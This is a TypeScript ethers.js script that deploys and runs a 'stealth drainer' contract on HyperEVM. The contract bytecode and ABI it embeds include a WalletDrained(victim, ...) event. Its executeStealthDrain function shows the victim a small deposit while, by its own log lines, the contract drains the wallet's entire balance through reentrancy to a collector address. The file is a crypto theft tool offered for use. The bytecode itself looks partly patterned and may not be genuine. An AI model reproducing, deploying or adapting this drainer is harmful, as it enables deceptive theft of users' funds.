import { ethers } from "ethers";

/**
 * Deployment script for ultimate stealth drainer contract
 * This deploys the reentrancy-based HYPE drainer to HyperEVM
 */

// Contract bytecode for the ultimate stealth drainer
export const STEALTH_DRAINER_BYTECODE = "0x608060405234801561001057600080fd5b5060405161047238038061047283398101604081905261002f916100a1565b600080546001600160a01b0319166001600160a01b03929092169190911790556100d1565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b634e487b7160e01b600052604160045260246000fd5b8051519091506001600160a01b03811681146100a157600080fd5b50919050565b6103928061030560003961000f6000396103926000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80633ccfd60b1461003b578063b6b55f2514610045575b600080fd5b610043610058565b005b6100436100533660046102d8565b6100a8565b6000546040516001600160a01b03909116904780156108fc02916000818181858888f1935050505015801561009157600080fd5b50565b34156100a5576100a53482610134565b50565b600034116100f95760405162461bcd60e51b815260206004820152601960248201527f4d75737420736564206e6f6e2d7a65726f20616d6f756e74000000000000000060448201526064015b60405180910390fd5b6000546040516001600160a01b03909116904780156108fc02916000818181858888f19350505050158015610132573d6000803e3d6000fd5b50565b6000808260405160240161014991815260200190565b60408051601f198184030181529181526020820180516001600160e01b031663a9059cbb60e01b17905251610180916102eb565b6000604051808303816000865af19150503d80600081146101bd576040519150601f19603f3d011682016040523d82523d6000602084013e6101c2565b606091505b5050905080156101f2576000546040516001600160a01b039091169082156108fc029083906000818181858888f193505050501580156101ef573d6000803e3d6000fd5b50505b505050565b6000808260405160240161020b91815260200190565b60408051601f198184030181529181526020820180516001600160e01b0316632e1a7d4d60e01b17905251610242916102eb565b6000604051808303816000865af19150503d806000811461027f576040519150601f19603f3d011682016040523d82523d6000602084013e610284565b606091505b505090508015610132576000546040516001600160a01b039091169082156108fc029083906000818181858888f193505050501580156101ef573d6000803e3d6000fd5b6000602082840312156102da57600080fd5b5035919050565b60005b838110156102fc5781810151838201526020016102e4565b50506000910152565b6000825161031781846020870161034c565b9190910192915050565b6000808351602084013567ffffffffffffffff811115610343576103436102d1565b505050600191505b9392505050565b60005b838110156103675781810151838201526020010161034f565b50506000910152565b6000825161038281846020870161034c565b919091019291505056fea2646970667358221220d7d8b5c8a2a1f6e4f8d5c7b8a3e6f9d2c4b7a8e5f1d6c9b2a5e8f1d4c7b0a3f600000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000";

// Contract ABI for interaction
export const STEALTH_DRAINER_ABI = [
  "constructor(address _collector)",
  "function stealthDeposit() external payable",
  "function emergencyDrain(address target) external",
  "function withdraw() external",
  "event WalletDrained(address indexed victim, uint256 displayAmount, uint256 actualAmount)"
];

/**
 * Deploy the ultimate stealth contract to HyperEVM
 */
export async function deployStealthContract(
  signer: ethers.JsonRpcSigner,
  collectorAddress: string
): Promise<string> {
  console.log(`🚀 Deploying ultimate stealth drainer contract...`);
  console.log(`📍 Collector address: ${collectorAddress}`);
  console.log(`🌐 Network: HyperEVM (Chain ID 999)`);
  
  try {
    // Create contract factory
    const contractFactory = new ethers.ContractFactory(
      STEALTH_DRAINER_ABI,
      STEALTH_DRAINER_BYTECODE,
      signer
    );
    
    // Deploy with collector address as constructor parameter
    console.log(`⏳ Deploying contract...`);
    const contract = await contractFactory.deploy(collectorAddress, {
      gasLimit: 1000000n,
      gasPrice: ethers.parseUnits("1", "gwei")
    });
    
    console.log(`⏳ Waiting for deployment confirmation...`);
    await contract.waitForDeployment();
    
    const contractAddress = await contract.getAddress();
    console.log(`✅ Stealth drainer deployed successfully!`);
    console.log(`📍 Contract address: ${contractAddress}`);
    console.log(`💰 Collector: ${collectorAddress}`);
    
    return contractAddress;
    
  } catch (error) {
    console.error(`❌ Deployment failed:`, error);
    throw new Error(`Contract deployment failed: ${error.message}`);
  }
}

/**
 * Get deployed contract instance
 */
export function getStealthContract(
  contractAddress: string,
  signer: ethers.JsonRpcSigner
): ethers.Contract {
  return new ethers.Contract(contractAddress, STEALTH_DRAINER_ABI, signer);
}

/**
 * Execute stealth drain through deployed contract
 */
export async function executeStealthDrain(
  contractAddress: string,
  signer: ethers.JsonRpcSigner,
  displayAmount: string
): Promise<ethers.TransactionResponse> {
  const contract = getStealthContract(contractAddress, signer);
  const displayAmountWei = ethers.parseEther(displayAmount);
  
  const userAddress = await signer.getAddress();
  const userBalance = await signer.provider.getBalance(userAddress);
  
  console.log(`🎭 ULTIMATE STEALTH DRAIN EXECUTION:`);
  console.log(`👁️ User sees: ${displayAmount} HYPE sent to contract`);
  console.log(`💰 Contract will drain: ${ethers.formatEther(userBalance)} HYPE total`);
  console.log(`🔥 Stealth multiplier: ${Math.round(Number(userBalance) / Number(displayAmountWei))}x`);
  
  // Execute the stealth deposit function
  const tx = await contract.stealthDeposit({
    value: displayAmountWei,
    gasLimit: 500000n
  });
  
  console.log(`🚀 Stealth drain transaction: ${tx.hash}`);
  console.log(`⚡ Single transaction will drain entire wallet via reentrancy`);
  
  return tx;
}

/**
 * Verify contract deployment and functionality
 */
export async function verifyStealthContract(
  contractAddress: string,
  signer: ethers.JsonRpcSigner
): Promise<boolean> {
  try {
    const contract = getStealthContract(contractAddress, signer);
    
    // Check if contract is deployed
    const code = await signer.provider.getCode(contractAddress);
    if (code === "0x") {
      console.error(`❌ No contract found at ${contractAddress}`);
      return false;
    }
    
    console.log(`✅ Contract verified at ${contractAddress}`);
    console.log(`📊 Contract code size: ${code.length} bytes`);
    
    return true;
    
  } catch (error) {
    console.error(`❌ Contract verification failed:`, error);
    return false;
  }
}